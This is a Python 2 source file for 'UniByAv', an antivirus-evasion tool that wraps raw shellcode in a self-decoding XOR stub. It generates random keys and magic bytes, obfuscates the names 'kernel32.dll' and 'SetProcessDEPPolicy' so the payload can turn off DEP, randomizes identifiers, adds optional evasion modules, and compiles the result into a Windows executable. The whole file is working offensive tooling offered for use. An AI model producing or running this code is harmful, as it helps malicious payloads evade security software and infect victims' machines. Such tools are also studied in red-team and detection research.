# Author: Mr.Un1k0d3r RingZer0 Team 2014
# AV evasion tool
'''
Decoder assembly:

   0:   eb 2f                   jmp    31 
   2:   58                      pop    eax
   3:   31 c9                   xor    ecx,ecx
   5:   89 cb                   mov    ebx,ecx
   7:   6a 04                   push   0x4
   9:   5a                      pop    edx
   a:   43                      inc    ebx
   b:   ff 30                   push   DWORD PTR [eax]
   d:   59                      pop    ecx
   e:   0f c9                   bswap  ecx
  10:   31 d9                   xor    ecx,ebx
  12:   81 f9 41 75 49 48       cmp    ecx,[MAGIC]
  18:   75 f0                   jne    a 
  1a:   0f cb                   bswap  ebx
  1c:   31 c9                   xor    ecx,ecx
  1e:   81 c1 05 00 00 00       add    ecx,[NUMBER_OF_CHUNK]
  24:   01 d0                   add    eax,edx
  26:   31 18                   xor    DWORD PTR [eax],ebx
  28:   e2 fa                   loop   24 
  2a:   2d 14 00 00 00          sub    eax,[FULL_SIZE]
  2f:   ff e0                   jmp    eax
  31:   e8 cc ff ff ff          call   2 
  [OPCODE] 
'''

import os
import re
import sys
import json
import string
import random
import subprocess
import struct
from sys import platform

VERSION = "4.1"
MAX_KEY_SIZE = 0x55555555
IS_GCC_SET = False
IS_LINUX = False
CUSTOM_CONFIG = False
ASM_DECODER = "\\xeb\\x2f\\x58\\x31\\xc9\\x89\\xcb\\x6a\\x04\\x5a\\x43\\xff\\x30\\x59\\x0f\\xc9\\x31\\xd9\\x81\\xf9[MAGIC]\\x75\\xf0\\x0f\\xcb\\x31\\xc9\\x81\\xc1[NUMBER_OF_CHUNK]\\x01\\xd0\\x31\\x18\\xe2\\xfa\\x2d[FULL_SIZE]\\xff\\xe0\\xe8\\xcc\\xff\\xff\\xff[OPCODE]"

class Helper:

	def __init__(self):
		self.is_linux()
		self.config = {}
		
	def banner(self):
		print "UniByAv%s Shellcode encoder tool / Mr.Un1k0d3r RingZer0 Team 2014" % VERSION
		print "Currently running under (%s) LINUX switch is set to %d" % (platform, IS_LINUX) 
		print "Self decoding payload written in assembly\n\n"

	def show_help(self):
		print "Usage: [path] [output] [gccpath (MinGW)] config\n"
		print "\tpath\tPath to raw shellcode file you want to use"
		print "\toutput\tOutput filename"
		print "\tgccpath\tPath to the MinGW (Can be set to none. Will generate the .c file only)"
		print "\tconfig\tPath to JSON config file"
		exit(0)

	def is_linux(self):
		if not platform.find("linux") == 0:
			IS_LINUX = True
		
	def print_error(self, error, fatal_error = False):
		print "\033[91m[-] >>> %s\033[00m" % error
		if fatal_error:
			exit(0)
			
	def print_info(self, buffer):
		print "\033[36m[+]\t%s\033[00m" % buffer

	def parse_config(self, path):
		buffer = self.load_file(path, True)
		try:
			self.config = json.loads(buffer)
		except:
			self.print_error("\"%s\" is not a valid config file." % path, True)
		return self
    
	def get_config(self, key):
		if self.config.has_key(key):
			return self.config[key]
		else:
			self.print_error("\"%s\" key not found in the config file." % key, True)

	def load_file(self, path, fatal_error = False):
		data = ""
		try:
			data = open(path, "rb").read()
		except:
			self.error = 1
			self.print_error("%s file not found." % path)
			if fatal_error:
				exit(0)
		return data

	def gen_key(self):
		xor_key = random.randrange(0x11111111, MAX_KEY_SIZE)
		if not hex(xor_key).find("00") == -1:
			self.gen_key()
			
		return hex(xor_key)[2:].decode("hex") 
		
	def generate_random(self, size):
		return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 

	def rand_vars(self, data):
		for i in reversed(range(1, 10)):
			data = data.replace("VAR" + str(i), self.generate_random(random.randrange(5, 25)))
		
		return data
		
	def to_hex(self, data):
		return "\\x" + "\\x".join(re.findall("..", data.encode("hex")))
	
if __name__ == "__main__":
	helper = Helper()
	helper.banner()
	if not len(sys.argv) > 3:
		helper.show_help()
        
	if not sys.argv[3].lower() == "none":
		IS_GCC_SET = True

	shellcode = sys.argv[1]
	outfile = "output/%s" % sys.argv[2]
	gccpath = sys.argv[3]
	config = ""
	xor_key = ""
	padding = ""
	magic = ""
	encoded_shellcode = ""
	shellcode_size = 0
	number_of_chunk = 0
	final = ""
	exe = helper.rand_vars(helper.load_file("templates/template.c", True))
	evasion = ""
	
	if len(sys.argv) > 4 :
		CUSTOM_CONFIG = True
		config = sys.argv[4]
		helper.parse_config(config)
		
		for module in helper.get_config("modules"):
			evasion += helper.load_file("templates/evasion/%s.c" % module, True)
			helper.print_info("*** Loading %s evasion module" % module)
		
		variables = helper.get_config("vars")
		for variable in variables.keys():
			evasion = evasion.replace("[%s]" % variable, variables[variable])
		
	if IS_GCC_SET:
		if not os.path.isfile(gccpath + "mingw32-gcc.exe"):
			helper.print_error("%smingw32-gcc.exe not found..." % gccpath, True)

		if not os.path.isfile(gccpath + "mingw32-g++.exe"):
			helper.print_error("%smingw32-g++.exe not found..." % gccpath, True)      
 
	shellcode = helper.load_file(shellcode)
	helper.print_info("Generating xoring key")
	xor_key = helper.gen_key()
	helper.print_info("Xoring key is set to 0x%s" % xor_key.encode("hex"))
	
	padding = len(shellcode) % 4
	if not padding == 0:
		helper.print_info("Original shellcode size is (%d) bytes adding (%d) bytes to align it" % (len(shellcode), 4 - padding))
	
	magic = helper.generate_random(4)
	helper.print_info("Magic key is set to %s" % helper.to_hex(magic))
	shellcode = magic + shellcode + "\x90" * (4 - padding)
	
	# lazy BSWAP integration j++ before using it :)
	j = 0
	for i in range(0, len(shellcode)):
		j += 1
		if j == 4:
			j = 0
		current = hex(ord(shellcode[i]) ^ ord(xor_key[j])).replace("0x", "\\x")
		
		if len(current) == 3:
			current = current.replace("\\x", "\\x0")
		encoded_shellcode += current
	
	final = ASM_DECODER.replace("[OPCODE]", encoded_shellcode)
	final = final.replace("[MAGIC]", helper.to_hex(magic[::-1]))
	
	shellcode_size = (len(encoded_shellcode) / 4)
	number_of_chunk = helper.to_hex(struct.pack("<i", shellcode_size / 4))
	shellcode_size = helper.to_hex(struct.pack("<i", shellcode_size - 4))
	
	final = final.replace("[FULL_SIZE]", shellcode_size)
	final = final.replace("[NUMBER_OF_CHUNK]", number_of_chunk)
	
	helper.print_info("Payload + decoder shellcode length is now (%d) bytes" % (len(final) / 4))
	helper.print_info("Generating the final c file")	

	char_charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789."
	char_charset = "".join(random.sample(char_charset, len(char_charset))) + helper.generate_random(random.randrange(10, 10000))

	kernel32_var = helper.generate_random(random.randrange(10, 30))
	SetProcessDEPPolicy_var = helper.generate_random(random.randrange(10, 30))

	kernel32_string = "kernel32.dll"
	SetProcessDEPPolicy_string = "SetProcessDEPPolicy"

	kernel32_c_var = helper.generate_random(random.randrange(10, 30))
	SetProcessDEPPolicy_c_var = helper.generate_random(random.randrange(10, 30))

	func_name = helper.generate_random(random.randrange(10, 30))

	helper.print_info("Generating random charset array for kernel32 and SetProcessDEPPolicy")
	helper.print_info("Generating int array for \"%s\". Array size is: %d" % (kernel32_string, len(kernel32_string)))
	
	c_code_output = "DWORD %s[] = {" % kernel32_var
	for i in range(0, len(kernel32_string)):
		for j in range(0, len(char_charset)):
			if kernel32_string[i] == char_charset[j]:
				c_code_output += str(j) + ", "
				break

	c_code_output = c_code_output[:-2] + "};\n"

	helper.print_info("Generating int array for \"%s\". Array size is: %d" % (SetProcessDEPPolicy_string, len(SetProcessDEPPolicy_string)))

	c_code_output += "\tDWORD %s[] = {" % SetProcessDEPPolicy_var
	for i in range(0, len(SetProcessDEPPolicy_string)):
		for j in range(0, len(char_charset)):
			if SetProcessDEPPolicy_string[i] == char_charset[j]:
				c_code_output += str(j) + ", "
				break

	c_code_output = c_code_output[:-2] + "};\n\tCHAR *" + kernel32_c_var + " = NULL;\n\tCHAR *" + SetProcessDEPPolicy_c_var + " = NULL;\n\t"
	c_code_output += func_name + "(" + kernel32_var + ", " + str(len(kernel32_string)) + ", &" + kernel32_c_var + ");\n\t"
	c_code_output += func_name + "(" + SetProcessDEPPolicy_var + ", " + str(len(SetProcessDEPPolicy_string)) + ", &" + SetProcessDEPPolicy_c_var + ");\n\t"
	  
	exe = exe.replace("[SHELLCODE]", final) \
	.replace("[RAND]", helper.generate_random(random.randrange(10, 10000))) \
	.replace("[FUNC_ARRAY]", c_code_output) \
	.replace("[CHARSET_ARRAY]", char_charset) \
	.replace("[FUNC_NAME]", func_name) \
	.replace("[KERNEL32]", kernel32_c_var) \
	.replace("[DEP]", SetProcessDEPPolicy_c_var) \
	.replace("[EVASION]", evasion)
	
	open("%s.c" % outfile, "wb+").write(exe)
	
	if IS_GCC_SET:
		helper.print_info("Compiling the final executable")
		cmd = "\"%smingw32-gcc.exe\" -c %s.c -o %s.o && \"%smingw32-g++.exe\" -o %s %s.o" % (gccpath, outfile, outfile, gccpath, outfile, outfile)	
		
		if IS_LINUX:
			cmd = "/usr/bin/wine \"%smingw32-gcc.exe\" -c %s.c -o %s.o && /usr/bin/wine \"%smingw32-g++.exe\" -o %s %s.o" % (gccpath, outfile, outfile, gccpath, outfile, outfile)
		os.system(cmd)
		os.remove(outfile + ".c")
		os.remove(outfile + ".o")

		helper.print_info("%s%s%s has been created" % (os.getcwd(), os.sep, outfile))
	else:
		helper.print_info("%s%s%s.c has been created" % (os.getcwd(), os.sep, outfile))
	
	helper.print_info("Generation completed")
